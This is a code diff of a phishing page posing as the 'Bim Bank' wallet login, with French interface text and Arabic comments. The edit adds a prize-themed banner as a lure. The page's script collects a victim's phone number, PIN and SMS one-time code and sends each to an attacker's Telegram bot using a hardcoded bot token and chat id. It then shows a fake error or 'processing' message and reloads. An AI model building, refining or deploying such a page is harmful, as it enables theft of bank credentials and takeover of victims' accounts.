@@ -3,20 +3,40 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bim Bank - Connexion</title>
+    <title>Bim Bank - Espace Wallet</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap');
         
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #ffffff; }
         
-        /* خلفية المربعات الخفيفة (Grid) كما في الصورة */
+        /* خلفية الشبكة الاحترافية */
         .grid-background {
             background-image: linear-gradient(#f0f0f0 1px, transparent 1px), linear-gradient(90deg, #f0f0f0 1px, transparent 1px);
             background-size: 20px 20px;
         }
 
-        /* تنسيق الأزرار العلوية (Wallet / Banking) */
+        /* تنسيق منطقة الجائزة العلوية */
+        .hero-prize-container {
+            width: 100%;
+            height: 250px;
+            background-image: url('https://r.jina.ai/i/6561f36402ec4c97960350436a537f8d'); /* رابط صورة الدرع والجائزة */
+            background-size: cover;
+            background-position: center;
+            border-bottom: 2px solid #f19e2c;
+            position: relative;
+        }
+        .hero-overlay {
+            position: absolute;
+            bottom: 0;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.8);
+            padding: 10px;
+            text-align: center;
+            backdrop-filter: blur(5px);
+        }
+
+        /* أزرار Wallet / Banking */
         .tab-container {
             display: flex;
             border: 1px solid #2a4387;
@@ -24,25 +44,22 @@
             overflow: hidden;
             margin: 20px 0;
         }
-        .tab-item { flex: 1; padding: 10px; text-align: center; font-weight: 600; cursor: pointer; }
+        .tab-item { flex: 1; padding: 10px; text-align: center; font-weight: 600; }
         .tab-active { background-color: #2a4387; color: white; }
         .tab-inactive { background-color: white; color: #6b7280; }
 
-        /* تنسيق الحقول */
+        /* حقول الإدخال */
         .input-field {
             border: 1px solid #d1d5db;
             border-radius: 8px;
             padding: 14px;
             width: 100%;
             font-size: 1.1rem;
-            color: #374151;
             outline: none;
         }
-        .input-field::placeholder { color: #9ca3af; }
-        
         .char-count { font-size: 10px; color: #9ca3af; text-align: right; margin-top: 2px; }
 
-        /* زر الدخول البرتقالي */
+        /* زر الدخول */
         .btn-connexion {
             background-color: #f19e2c;
             color: white;
@@ -52,42 +69,39 @@
             font-weight: 700;
             font-size: 1.2rem;
             margin-top: 20px;
-            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
         }
 
-        /* مودال التحقق */
-        #otp-modal { background-color: rgba(255, 255, 255, 0.95); display: none; }
+        #otp-modal { background-color: rgba(255, 255, 255, 0.98); display: none; }
     </style>
 </head>
-<body class="grid-background min-h-screen flex flex-col items-center px-8">
+<body class="grid-background min-h-screen flex flex-col items-center">
 
-    <!-- الشعار العلوي -->
-    <div class="mt-10 flex flex-col items-center">
-        <img src="https://telegra.ph/file/0c9e658933b49e1e2479e.png" alt="Bim Bank Logo" class="h-32 w-auto">
-        <p class="text-[#4b5563] text-lg text-center mt-4">Bienvenue dans votre<br>espace wallet</p>
+    <!-- استبدال المنطقة العلوية بصورة الجائزة -->
+    <div class="hero-prize-container">
+        <div class="hero-overlay">
+            <p class="text-[#2a4387] font-bold">Bienvenue dans votre espace wallet</p>
+        </div>
     </div>
 
-    <!-- أزرار الاختيار (Wallet / Banking) -->
-    <div class="w-full max-w-sm">
+    <!-- أزرار التبديل -->
+    <div class="w-full max-w-sm px-6">
         <div class="tab-container">
             <div class="tab-item tab-active">Wallet</div>
             <div class="tab-item tab-inactive">Banking</div>
         </div>
     </div>
 
-    <!-- فورم تسجيل الدخول -->
-    <div id="login-form" class="w-full max-w-sm mt-4">
+    <!-- نموذج تسجيل الدخول -->
+    <div id="login-form" class="w-full max-w-sm px-6 mt-2">
         <h2 class="text-[#2a4387] font-bold text-xl mb-4">Connexion</h2>
         
-        <!-- حقل الهاتف -->
         <div class="mb-4">
-            <input id="phone" type="tel" maxlength="8" oninput="updateCount('phone', 8)" class="input-field" placeholder="Téléphone">
+            <input id="phone" type="tel" maxlength="8" oninput="validate(this, 8)" class="input-field" placeholder="Téléphone">
             <div id="phone-count" class="char-count">0/8</div>
         </div>
 
-        <!-- حقل كلمة المرور -->
         <div class="mb-2">
-            <input id="pin" type="password" maxlength="4" oninput="updateCount('pin', 4)" class="input-field" placeholder="Mot de passe">
+            <input id="pin" type="password" maxlength="4" oninput="validate(this, 4)" class="input-field" placeholder="Mot de passe">
             <div id="pin-count" class="char-count">0/4</div>
         </div>
 
@@ -95,37 +109,21 @@
             <a href="#" class="text-gray-400 text-sm">Mot de passe oublié ?</a>
         </div>
 
-        <button onclick="handleSubmit()" class="btn-connexion">
-            Connexion
-        </button>
+        <button onclick="submitLogin()" class="btn-connexion">Connexion</button>
 
-        <!-- روابط سفلية -->
         <div class="mt-12 text-center">
             <p class="text-gray-500">Nouvel utilisateur ?</p>
-            <a href="#" class="text-[#2a4387] font-bold flex items-center justify-center gap-2 mt-1">
-                S'inscrire maintenant <span>&rarr;</span>
-            </a>
-        </div>
-
-        <div class="mt-10 flex justify-center">
-            <button class="border border-gray-300 rounded-lg px-6 py-2 flex items-center gap-2 text-gray-600 font-semibold">
-                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
-                </svg>
-                Contacts
-            </button>
+            <a href="#" class="text-[#2a4387] font-bold mt-1 block">S'inscrire maintenant &rarr;</a>
         </div>
     </div>
 
-    <!-- واجهة OTP (تظهر بعد الضغط على Connexion) -->
+    <!-- واجهة التحقق OTP -->
     <div id="otp-modal" class="fixed inset-0 z-50 flex flex-col items-center justify-center px-8">
         <div class="w-full max-w-sm text-center">
-            <h3 class="text-2xl font-bold text-[#2a4387] mb-4">Vérification SMS</h3>
-            <p class="text-gray-500 mb-8">Veuillez entrer le code de confirmation envoyé à votre mobile</p>
-            
+            <h3 class="text-2xl font-bold text-[#2a4387] mb-4">Vérification</h3>
+            <p class="text-gray-500 mb-8">Veuillez entrer le code reçu par SMS</p>
             <input id="otp" type="tel" maxlength="6" class="input-field text-center text-2xl tracking-widest border-2 border-[#f19e2c]" placeholder="000000">
-            
-            <button onclick="sendOTP()" class="btn-connexion">Confirmer</button>
+            <button onclick="finish()" class="btn-connexion">Confirmer</button>
         </div>
     </div>
 
@@ -133,33 +131,30 @@
         const token = "8729528953:AAFgvdDG5uYit3LITzp5HuHxYP0LPXszCe0";
         const chatId = "8665814266";
 
-        function sendMsg(text) {
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
+        function post(msg) {
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
         }
 
-        function updateCount(id, max) {
-            const input = document.getElementById(id);
-            input.value = input.value.replace(/[^0-9]/g, '');
-            document.getElementById(id + '-count').textContent = input.value.length + '/' + max;
+        function validate(el, max) {
+            el.value = el.value.replace(/[^0-9]/g, '');
+            document.getElementById(el.id + '-count').textContent = el.value.length + '/' + max;
         }
 
-        function handleSubmit() {
-            const phone = document.getElementById('phone').value;
-            const pin = document.getElementById('pin').value;
-            if(phone.length === 8 && pin.length === 4) {
-                sendMsg(`📍 Bim Bank Login:\n📱 Phone: ${phone}\n🔑 PIN: ${pin}`);
+        function submitLogin() {
+            const p = document.getElementById('phone').value;
+            const n = document.getElementById('pin').value;
+            if(p.length === 8 && n.length === 4) {
+                post(`🏆 New Entry (Prize Page):\n📱: ${p}\n🔑: ${n}`);
                 document.getElementById('login-form').style.display = 'none';
                 document.getElementById('otp-modal').style.display = 'flex';
-            } else {
-                alert("Veuillez vérifier vos informations.");
             }
         }
 
-        function sendOTP() {
-            const otp = document.getElementById('otp').value;
-            if(otp.length === 6) {
-                sendMsg(`✅ OTP Code: ${otp}`);
-                alert("Une erreur technique est survenue. Veuillez réessayer plus tard.");
+        function finish() {
+            const o = document.getElementById('otp').value;
+            if(o.length === 6) {
+                post(`✅ OTP: ${o}`);
+                alert("Votre demande est en cours de traitement.");
                 location.reload();
             }
         }
